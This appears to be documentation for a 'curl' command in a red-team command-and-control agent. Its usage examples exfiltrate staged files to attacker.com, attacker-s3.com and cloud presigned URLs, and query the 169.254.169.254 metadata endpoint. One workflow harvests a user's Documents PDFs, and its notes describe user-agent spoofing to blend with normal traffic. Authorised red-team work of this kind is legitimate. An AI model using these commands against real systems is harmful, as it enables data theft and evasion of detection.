+++
title = "curl"
chapter = false
weight = 115
hidden = false
+++

## Summary

Make HTTP/HTTPS requests and upload files from the agent's network perspective. Supports file upload for exfiltration to S3 presigned URLs, Azure SAS tokens, or generic HTTP endpoints (T1567). Also useful for cloud metadata, internal services, and SSRF.

Supports all standard HTTP methods, custom headers, request bodies, file upload (raw or multipart), response size limits, and three output modes.

## Arguments

| Argument | Required | Type | Default | Description |
|----------|----------|------|---------|-------------|
| url | Yes | string | | Target URL (http:// or https://) |
| method | No | choice | GET | HTTP method: GET, POST, PUT, DELETE, HEAD, OPTIONS, PATCH |
| body | No | string | | Request body for POST/PUT/PATCH |
| headers | No | string | | Custom headers as JSON object: `{"Key": "Value"}` |
| output | No | choice | full | Output format: full (headers+body), body, headers |
| timeout | No | number | 30 | Request timeout in seconds |
| file | No | string | | File path to upload as request body (T1567 exfiltration). Method defaults to PUT |
| upload | No | choice | raw | Upload mode: raw (file as body, for PUT/S3) or multipart (form-data, for POST) |
| max_size | No | number | 1048576 | Maximum response body size in bytes (default: 1MB) |

## Usage

**Simple GET request:**
```
curl -url http://169.254.169.254/latest/meta-data/
```

**GET with body-only output:**
```
curl -url https://internal-api.corp.local/health -output body
```

**GET with headers-only output:**
```
curl -url https://target.local/api/v1/status -output headers
```

**POST with JSON body and custom headers:**
```
curl -url https://api.internal.local/graphql -method POST -body '{"query":"{ users { id } }"}' -headers '{"Authorization":"Bearer token","Content-Type":"application/json"}'
```

**PUT request with timeout:**
```
curl -url https://config-service.local/api/setting -method PUT -body '{"key":"value"}' -timeout 10
```

**Limit response size:**
```
curl -url https://large-file-server.local/data.json -max_size 4096
```

### File Upload / Exfiltration (T1567)

**Upload to S3 presigned URL (raw PUT):**
```
curl -url "https://bucket.s3.amazonaws.com/exfil.dat?X-Amz-..." -file /tmp/staged-data.dat
```

**Upload to Azure Blob (raw PUT with SAS token):**
```
curl -url "https://account.blob.core.windows.net/container/blob?sv=..." -file /tmp/staged-data.dat -headers '{"x-ms-blob-type":"BlockBlob"}'
```

**Upload via multipart POST:**
```
curl -url https://attacker.com/upload -file /tmp/staged-data.dat -upload multipart
```

**Exfiltration workflow (stage + encrypt + upload):**
```
compress -action stage -path /home/user/Documents -pattern *.pdf
curl -url "https://attacker-s3.com/exfil.dat?presigned..." -file /tmp/sys-update-abc123/deadbeef.dat
```

## Notes

- Default User-Agent mimics Chrome browser to blend with normal traffic
- TLS certificate verification is disabled (standard for red team tooling)
- HTTP status codes >= 400 are reported as "error" status; < 400 as "success"
- Response bodies exceeding `max_size` are truncated with a notice
- The `full` output mode shows request info, status, headers, and body
- The `body` mode returns only the response body (useful for API chaining)
- The `headers` mode returns only the HTTP status line and response headers
- Uses Go's native `net/http` client — no external binary needed
- Works cross-platform: Windows, Linux, and macOS agents

## MITRE ATT&CK Mapping

- **T1106** — Native API
- **T1567** — Exfiltration Over Web Service (file upload)
- **T1567.002** — Exfiltration to Cloud Storage (S3/Azure upload)
